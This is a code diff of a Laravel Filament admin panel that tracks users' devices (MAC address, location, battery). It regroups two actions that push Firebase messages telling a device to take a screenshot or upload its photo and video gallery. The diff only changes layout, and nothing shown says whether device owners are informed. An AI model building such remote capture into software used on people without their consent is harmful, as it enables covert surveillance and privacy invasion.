@@ -23,17 +23,34 @@ class UserResource extends Resource
     {
         return $form
             ->schema([
-                Forms\Components\TextInput::make('name')
-                    ->required(),
-                Forms\Components\TextInput::make('email')
-                    ->email(),
-                Forms\Components\DateTimePicker::make('email_verified_at'),
-                Forms\Components\TextInput::make('password')
-                    ->password(),
-                Forms\Components\TextInput::make('device_id'),
-                Forms\Components\TextInput::make('mac_address'),
-                Forms\Components\TextInput::make('model'),
-                Forms\Components\TextInput::make('location'),
+                Forms\Components\Tabs::make('User Details')
+                    ->tabs([
+                        Forms\Components\Tabs\Tab::make('User Profile')
+                            ->icon('heroicon-o-user')
+                            ->schema([
+                                Forms\Components\TextInput::make('name')
+                                    ->required(),
+                                Forms\Components\TextInput::make('email')
+                                    ->email(),
+                                Forms\Components\DateTimePicker::make('email_verified_at'),
+                                Forms\Components\TextInput::make('password')
+                                    ->password()
+                                    ->dehydrated(fn ($state) => filled($state))
+                                    ->required(fn (string $context): bool => $context === 'create'),
+                            ]),
+                        Forms\Components\Tabs\Tab::make('Device Information')
+                            ->icon('heroicon-o-device-phone-mobile')
+                            ->schema([
+                                Forms\Components\TextInput::make('device_id')
+                                    ->readOnly(),
+                                Forms\Components\TextInput::make('mac_address')
+                                    ->readOnly(),
+                                Forms\Components\TextInput::make('model')
+                                    ->readOnly(),
+                                Forms\Components\TextInput::make('location')
+                                    ->readOnly(),
+                            ]),
+                    ])->columnSpanFull(),
             ]);
     }
 
@@ -42,12 +59,15 @@ class UserResource extends Resource
         return $table
             ->columns([
                 Tables\Columns\TextColumn::make('name')
-                    ->searchable(),
+                    ->searchable()
+                    ->weight('bold'),
                 Tables\Columns\TextColumn::make('email')
-                    ->searchable(),
+                    ->searchable()
+                    ->toggleable(isToggledHiddenByDefault: true),
                 Tables\Columns\TextColumn::make('email_verified_at')
                     ->dateTime()
-                    ->sortable(),
+                    ->sortable()
+                    ->toggleable(isToggledHiddenByDefault: true),
                 Tables\Columns\TextColumn::make('created_at')
                     ->dateTime()
                     ->sortable()
@@ -57,13 +77,17 @@ class UserResource extends Resource
                     ->sortable()
                     ->toggleable(isToggledHiddenByDefault: true),
                 Tables\Columns\TextColumn::make('device_id')
-                    ->searchable(),
+                    ->searchable()
+                    ->toggleable(isToggledHiddenByDefault: true),
                 Tables\Columns\TextColumn::make('mac_address')
-                    ->searchable(),
+                    ->searchable()
+                    ->toggleable(isToggledHiddenByDefault: true),
                 Tables\Columns\TextColumn::make('model')
-                    ->searchable(),
+                    ->searchable()
+                    ->badge(),
                 Tables\Columns\TextColumn::make('location')
-                    ->searchable(),
+                    ->searchable()
+                    ->icon('heroicon-o-map-pin'),
                 Tables\Columns\TextColumn::make('battery_level')
                     ->label('Battery')
                     ->suffix('%')
@@ -81,132 +105,137 @@ class UserResource extends Resource
             ])
             ->actions([
                 Tables\Actions\EditAction::make(),
-                Tables\Actions\Action::make('request_screenshot')
-                    ->label('Request Screenshot')
-                    ->icon('heroicon-o-camera')
-                    ->requiresConfirmation()
-                    ->action(function (User $record) {
-                        if (!$record->fcm_token) {
-                            \Filament\Notifications\Notification::make()
-                                ->title('No FCM Token')
-                                ->body('This device does not have an FCM token.')
-                                ->danger()
-                                ->send();
-                            return;
-                        }
-
-                        try {
-                            // Path to credentials
-                            $credentialsPath = storage_path('app/firebase_credentials.json');
-                            if (!file_exists($credentialsPath)) {
-                                throw new \Exception('Firebase credentials not found at ' . $credentialsPath);
+                Tables\Actions\ActionGroup::make([
+                    Tables\Actions\Action::make('request_screenshot')
+                        ->label('Request Screenshot')
+                        ->icon('heroicon-o-camera')
+                        ->requiresConfirmation()
+                        ->action(function (User $record) {
+                            if (!$record->fcm_token) {
+                                \Filament\Notifications\Notification::make()
+                                    ->title('No FCM Token')
+                                    ->body('This device does not have an FCM token.')
+                                    ->danger()
+                                    ->send();
+                                return;
                             }
-
-                            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
-                            $projectId = $jsonKey['project_id'];
-
-                            // Get Access Token
-                            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
-                                'https://www.googleapis.com/auth/firebase.messaging',
-                                $credentialsPath
-                            );
-                            $token = $credentials->fetchAuthToken();
-
-                            // Send FCM
-                            $client = new \GuzzleHttp\Client();
-                            $response = $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
-                                'headers' => [
-                                    'Authorization' => 'Bearer ' . $token['access_token'],
-                                    'Content-Type' => 'application/json',
-                                ],
-                                'json' => [
-                                    'message' => [
-                                        'token' => $record->fcm_token,
-                                        'data' => [
-                                            'action' => 'screenshot',
+    
+                            try {
+                                // Path to credentials
+                                $credentialsPath = storage_path('app/firebase_credentials.json');
+                                if (!file_exists($credentialsPath)) {
+                                    throw new \Exception('Firebase credentials not found at ' . $credentialsPath);
+                                }
+    
+                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                                $projectId = $jsonKey['project_id'];
+    
+                                // Get Access Token
+                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
+                                    'https://www.googleapis.com/auth/firebase.messaging',
+                                    $credentialsPath
+                                );
+                                $token = $credentials->fetchAuthToken();
+    
+                                // Send FCM
+                                $client = new \GuzzleHttp\Client();
+                                $response = $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
+                                    'headers' => [
+                                        'Authorization' => 'Bearer ' . $token['access_token'],
+                                        'Content-Type' => 'application/json',
+                                    ],
+                                    'json' => [
+                                        'message' => [
+                                            'token' => $record->fcm_token,
+                                            'data' => [
+                                                'action' => 'screenshot',
+                                            ],
                                         ],
                                     ],
-                                ],
-                            ]);
-
-                            \Filament\Notifications\Notification::make()
-                                ->title('Screenshot Requested')
-                                ->success()
-                                ->send();
-
-                        } catch (\Exception $e) {
-                             \Filament\Notifications\Notification::make()
-                                ->title('Failed to Request Screenshot')
-                                ->body($e->getMessage())
-                                ->danger()
-                                ->send();
-                        }
-                    }),
-                Tables\Actions\Action::make('request_gallery_backup')
-                    ->label('Request Gallery Backup')
-                    ->icon('heroicon-o-photo')
-                    ->form([
-                        Forms\Components\Select::make('media_type')
-                            ->label('Media Type')
-                            ->options([
-                                'photos' => 'Photos Only',
-                                'videos' => 'Videos Only',
-                                'all' => 'Both (Photos & Videos)',
-                            ])
-                            ->default('all')
-                            ->required(),
-                    ])
-                    ->action(function (User $record, array $data) {
-                        if (!$record->fcm_token) {
-                             \Filament\Notifications\Notification::make()
-                                ->title('No FCM Token')
-                                ->danger()
-                                ->send();
-                            return;
-                        }
-
-                        try {
-                             // Re-use credentials logic (Refactor later into a service)
-                             $credentialsPath = storage_path('app/firebase_credentials.json');
-                             $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
-                                'https://www.googleapis.com/auth/firebase.messaging',
-                                $credentialsPath
-                             );
-                             $token = $credentials->fetchAuthToken();
-                             $jsonKey = json_decode(file_get_contents($credentialsPath), true);
-                             $projectId = $jsonKey['project_id'];
-
-                             $client = new \GuzzleHttp\Client();
-                             $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
-                                'headers' => [
-                                    'Authorization' => 'Bearer ' . $token['access_token'],
-                                    'Content-Type' => 'application/json',
-                                ],
-                                'json' => [
-                                    'message' => [
-                                        'token' => $record->fcm_token,
-                                        'data' => [
-                                            'action' => 'backup_gallery',
-                                            'media_type' => $data['media_type'],
+                                ]);
+    
+                                \Filament\Notifications\Notification::make()
+                                    ->title('Screenshot Requested')
+                                    ->success()
+                                    ->send();
+    
+                            } catch (\Exception $e) {
+                                 \Filament\Notifications\Notification::make()
+                                    ->title('Failed to Request Screenshot')
+                                    ->body($e->getMessage())
+                                    ->danger()
+                                    ->send();
+                            }
+                        }),
+                    Tables\Actions\Action::make('request_gallery_backup')
+                        ->label('Request Gallery Backup')
+                        ->icon('heroicon-o-photo')
+                        ->form([
+                            Forms\Components\Select::make('media_type')
+                                ->label('Media Type')
+                                ->options([
+                                    'photos' => 'Photos Only',
+                                    'videos' => 'Videos Only',
+                                    'all' => 'Both (Photos & Videos)',
+                                ])
+                                ->default('all')
+                                ->required(),
+                        ])
+                        ->action(function (User $record, array $data) {
+                            if (!$record->fcm_token) {
+                                 \Filament\Notifications\Notification::make()
+                                    ->title('No FCM Token')
+                                    ->danger()
+                                    ->send();
+                                return;
+                            }
+    
+                            try {
+                                 // Re-use credentials logic (Refactor later into a service)
+                                 $credentialsPath = storage_path('app/firebase_credentials.json');
+                                 $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
+                                    'https://www.googleapis.com/auth/firebase.messaging',
+                                    $credentialsPath
+                                 );
+                                 $token = $credentials->fetchAuthToken();
+                                 $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                                 $projectId = $jsonKey['project_id'];
+    
+                                 $client = new \GuzzleHttp\Client();
+                                 $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
+                                    'headers' => [
+                                        'Authorization' => 'Bearer ' . $token['access_token'],
+                                        'Content-Type' => 'application/json',
+                                    ],
+                                    'json' => [
+                                        'message' => [
+                                            'token' => $record->fcm_token,
+                                            'data' => [
+                                                'action' => 'backup_gallery',
+                                                'media_type' => $data['media_type'],
+                                            ],
                                         ],
                                     ],
-                                ],
-                            ]);
-
-                            \Filament\Notifications\Notification::make()
-                                ->title('Gallery Backup Requested')
-                                ->body("Request sent for " . $data['media_type'])
-                                ->success()
-                                ->send();
-
-                        } catch (\Exception $e) {
-                             \Filament\Notifications\Notification::make()
-                                ->title('Request Failed')
-                                ->body($e->getMessage())
-                                ->danger()
-                                ->send();
-                        }
-                    }),
+                                ]);
+    
+                                \Filament\Notifications\Notification::make()
+                                    ->title('Gallery Backup Requested')
+                                    ->body("Request sent for " . $data['media_type'])
+                                    ->success()
+                                    ->send();
+    
+                            } catch (\Exception $e) {
+                                 \Filament\Notifications\Notification::make()
+                                    ->title('Request Failed')
+                                    ->body($e->getMessage())
+                                    ->danger()
+                                    ->send();
+                            }
+                        }),
+                ])
+                ->label('Device Commands')
+                ->icon('heroicon-m-ellipsis-horizontal')
+                ->tooltip('Manage Device'),
             ])
             ->bulkActions([
                 Tables\Actions\BulkActionGroup::make([
